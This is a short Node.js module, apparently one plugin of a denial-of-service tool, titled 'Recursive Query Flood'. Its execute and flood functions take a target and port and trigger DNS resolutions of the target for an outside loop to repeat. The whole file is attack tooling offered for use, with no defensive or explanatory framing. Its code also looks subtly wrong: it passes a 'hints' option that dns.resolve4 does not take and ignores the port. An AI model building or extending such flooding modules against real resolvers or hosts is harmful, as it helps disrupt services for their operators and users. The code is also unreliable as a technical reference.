const dns = require('dns');

module.exports = {
    name: 'Recursive Query Flood',
    description: 'Forces recursive DNS lookups',
    
    execute: async (target, port) => {
        return new Promise((resolve, reject) => {
            dns.resolve4(target, { hints: dns.ADDRCONFIG }, (err, addresses) => {
                if (err) reject(err);
                else resolve({ addresses, recursive: true });
            });
        });
    },
    
    flood: (target, port, callback) => {
        dns.resolve4(target, { hints: dns.ADDRCONFIG }, (err) => {
            callback(!err);
        });
    }
};